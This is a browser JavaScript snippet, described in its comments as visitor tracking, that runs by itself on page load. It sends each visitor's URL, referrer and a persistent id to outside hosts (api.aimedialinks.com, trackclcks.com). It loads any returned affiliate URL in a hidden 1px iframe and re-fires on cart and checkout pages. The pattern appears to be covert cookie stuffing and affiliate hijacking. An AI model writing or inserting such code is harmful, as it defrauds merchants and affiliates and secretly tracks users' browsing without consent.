(function () {

    // Generates a random UUID (v4-like) to identify the visitor.
    function generateUUID() {
        return ('xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx').replace(/[xy]/g, function (char) {
            const random = Math.random() * 0x10 | 0x0;
            const value = char === 'x' ? random : (random & 0x3 | 0x8);
            return value.toString(16);
        });
    }

    // Reads a cookie value by name.
    function getCookie(name) {
        const prefix = name + '=';
        const cookies = document.cookie.split(';');

        for (let i = 0; i < cookies.length; i++) {
            const cookie = cookies[i].trim();
            if (cookie.indexOf(prefix) === 0) {
                return cookie.substring(prefix.length, cookie.length);
            }
        }

        return '';
    }

    // Silently loads a tracking pixel/URL via a hidden iframe (falls back to an <img> pixel on error).
    function fireTrackingPixel(url) {
        try {
            const iframe = document.createElement('iframe');
            iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-forms');
            iframe.src = url;
            iframe.style.display = 'none';
            iframe.style.visibility = 'hidden';
            iframe.style.width = '1px';
            iframe.style.height = '1px';
            iframe.style.border = '0';

            iframe.onerror = function () {
                const img = new Image();
                img.src = url;
            };

            document.body.appendChild(iframe);

        } catch (err) {
            console.error('Iframe error:', err);
        }
    }

    // Checks if the current page looks like a cart/checkout/payment page.
    function isCartOrCheckoutPage() {
        const keywords = ['cart', 'checkout', 'pay', 'shipping', 'review-order', 'payment'];

        return keywords.some(function (keyword) {
            return window.location.pathname.toLowerCase().includes(keyword);
        });
    }

    // Core tracking call: sends visit info to the tracking API and fires the affiliate/fallback pixel.
    async function trackUser() {
        if (sessionStorage.getItem('tracking_done_' + window.location.hostname)) {
            if (!isCartOrCheckoutPage()) {
                return;
            }
        }

        try {
            let trackingUuid = getCookie('tracking_uuid') || generateUUID();

            let expiresAt = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();

            document.cookie = 'tracking_uuid=' + trackingUuid + '; expires=' + expiresAt + ';path=/;SameSite=Lax';

            let response = await fetch('https://api.aimedialinks.com/api/track-user', {
                method: 'POST',
                keepalive: true,
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: trackingUuid,
                    origin: window.location.hostname,
                    timestamp: new Date().getTime()
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            });

            let result = await response.json();

            if (result.success && result.affiliate_url) {
                fireTrackingPixel(result.affiliate_url);
                sessionStorage.setItem('tracking_done_' + window.location.hostname, 'true');

            } else {
                fireTrackingPixel('https://api.aimedialinks.com/api/fallback-pixel?id=' + trackingUuid);
            }

        } catch (err) {
            console.error('Tracking Failed:', err);
        }
    }

    // Fetches per-site config to decide whether tracking should always fire,
    // or only on cart/checkout pages.
    function loadSiteConfigAndTrack() {
        fetch('https://trackclcks.com/api/site-config?host=' + encodeURIComponent(window.location.hostname))
            .then(function (res) {
                if (!res.ok) {
                    throw new Error('Config API Failed');
                }
                return res.json();
            })
            .then(function (config) {
                if (!config || (!config.always && !config.cartExtra)) {
                    return;
                }

                if (config.always) {
                    trackUser();
                }

                if (config.cartExtra && isCartOrCheckoutPage()) {
                    trackUser();
                }
            })
            .catch(function (err) {
                console.error('Config fetch failed:', err);
            });
    }

    if (document.readyState === 'interactive' || document.readyState === 'complete') {
        loadSiteConfigAndTrack();
    } else {
        window.addEventListener('DOMContentLoaded', loadSiteConfigAndTrack);
    }

}());
